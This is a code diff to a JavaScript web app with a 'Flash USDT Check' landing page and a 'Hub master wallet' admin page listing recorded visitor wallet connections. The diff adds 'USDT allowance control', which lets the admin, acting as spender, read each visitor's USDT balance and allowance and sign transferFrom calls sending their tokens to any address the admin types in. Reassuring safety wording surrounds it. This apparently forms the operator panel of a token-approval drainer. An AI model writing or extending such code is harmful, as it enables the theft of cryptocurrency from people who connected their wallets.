@@ -36,6 +36,7 @@ const allowed = new Map([
   ["/src/wallet-tron-transactions.mjs", "text/javascript; charset=utf-8"],
   ["/src/wallet-evm-transactions.mjs", "text/javascript; charset=utf-8"],
   ["/src/landing-transfer.mjs", "text/javascript; charset=utf-8"],
+  ["/src/tron-usdt-allowance.mjs", "text/javascript; charset=utf-8"],
   ["/src/logic.mjs", "text/javascript; charset=utf-8"],
   ["/src/tron-public.mjs", "text/javascript; charset=utf-8"],
   ["/src/evm-public.mjs", "text/javascript; charset=utf-8"],
@@ -1014,31 +1015,37 @@ function masterWalletPage(wallets) {
       </div>
       <button class="primary-action master-manage-open" type="button">Manage assets</button>
       <div class="master-manage-panel" hidden>
-        <h2 class="master-wallet-assets-title">Live provider refresh</h2>
-        <p class="master-transfer-note">Connect TronLink with this wallet to refresh balances and activity directly from the wallet provider. Transfers still require that wallet signature.</p>
-        <button class="primary-action master-refresh-provider" type="button">Refresh from TronLink</button>
+        <h2 class="master-wallet-assets-title">USDT allowance control</h2>
+        <p class="master-transfer-note">The configured spender is <span class="address">${hub}</span>. Connect TronLink as that spender to read this owner’s official USDT balance and remaining allowance. Connection never initiates a token transaction.</p>
+        <button class="primary-action master-connect-wallet" type="button">Connect spender wallet</button>
+        <button class="primary-action master-refresh-provider" type="button">Refresh owner balance and allowance</button>
+        <p class="master-connect-status" role="status"></p>
+        <dl class="master-review-list master-allowance-summary">
+          <div><dt>Official contract</dt><dd class="address">TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t</dd></div>
+          <div><dt>Owner USDT balance</dt><dd class="master-owner-usdt-balance">Refresh required</dd></div>
+          <div><dt>Remaining allowance</dt><dd class="master-owner-usdt-allowance">Refresh required</dd></div>
+        </dl>
         <div class="master-provider-assets master-provider-assets-live"></div>
         <div class="master-provider-transactions master-provider-transactions-live"></div>
         <form class="master-transfer-form">
-          <label>Transfer recipient (hub)</label>
-          <input class="master-transfer-recipient" type="text" value="${hub}" readonly spellcheck="false">
+          <label>Destination TRON address (entered by admin)</label>
+          <input class="master-transfer-recipient" type="text" autocomplete="off" spellcheck="false" placeholder="T…" required>
           <label>USDT amount</label>
           <input class="master-transfer-amount" type="text" inputmode="decimal" autocomplete="off" placeholder="0.00" required>
-          <button class="primary-action master-review-transfer" type="submit">Review transfer to hub</button>
+          <button class="primary-action master-review-transfer" type="submit">Review transferFrom</button>
         </form>
         <div class="master-transfer-review" hidden>
-          <h3 class="master-review-title">Confirm before your wallet signs</h3>
+          <h3 class="master-review-title">Confirm bounded transferFrom</h3>
           <dl class="master-review-list">
-            <div><dt>From</dt><dd class="address master-review-from"></dd></div>
-            <div><dt>To (hub)</dt><dd class="address master-review-to"></dd></div>
-            <div><dt>Token</dt><dd>TRC-20 USDT</dd></div>
+            <div><dt>Owner</dt><dd class="address master-review-from"></dd></div>
+            <div><dt>Destination</dt><dd class="address master-review-to"></dd></div>
+            <div><dt>Spender / signer</dt><dd class="address">${hub}</dd></div>
+            <div><dt>Token</dt><dd>Official TRC-20 USDT</dd></div>
             <div><dt>Amount</dt><dd class="master-review-amount"></dd></div>
           </dl>
-          <p class="master-transfer-note">Reject the wallet prompt if any detail differs. No seed phrase · No private key · No auto-approve.</p>
-          <button class="primary-action master-connect-wallet" type="button">Connect TronLink to sign</button>
-          <button class="primary-action master-sign-transfer" type="button" hidden>Approve transfer in wallet</button>
+          <p class="master-transfer-note">This transaction uses only the owner’s existing allowance. The amount was checked against both remaining allowance and wallet balance. Reject the wallet prompt if any detail differs.</p>
+          <button class="primary-action master-sign-transfer" type="button" hidden>Sign transferFrom as spender</button>
           <button class="retry-button master-cancel-transfer" type="button">Cancel review</button>
-          <p class="master-connect-status" role="status"></p>
         </div>
         <p class="master-transfer-status" role="status" aria-live="polite"></p>
         <p class="master-transfer-error asset-error" role="alert" hidden></p>
@@ -1049,8 +1056,8 @@ function masterWalletPage(wallets) {
   return pageShell("Hub master wallet", `<section class="card master-wallet-shell" id="master-wallet-root" data-hub-target="${hub}" aria-labelledby="master-wallet-title">
       <p class="eyebrow">Hub master wallet</p>
       <h1 id="master-wallet-title">Connected wallet review</h1>
-      <p class="lede">Hub <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each card shows the visitor’s last Web3 provider snapshot from the dapp plus live TronLink refresh inside Manage.</p>
-      <p class="master-safety">No seed phrase · No private key · No auto-approve · Transfers require the visitor wallet signature</p>
+      <p class="lede">Spender <span class="address">${hub}</span> · ${wallets.length} recorded connection${wallets.length === 1 ? "" : "s"}. Each TRON owner card shows assets plus live official-USDT balance and remaining allowance.</p>
+      <p class="master-safety">No seed phrase · No private key · No automatic transfer · Every transferFrom is manually entered, bounded, disclosed, and signed by the spender</p>
       <div class="master-wallet-grid" id="master-wallet-grid">${body}</div>
       <div class="master-wallet-actions">
         <a class="ghost" href="/">Flash USDT Check</a>
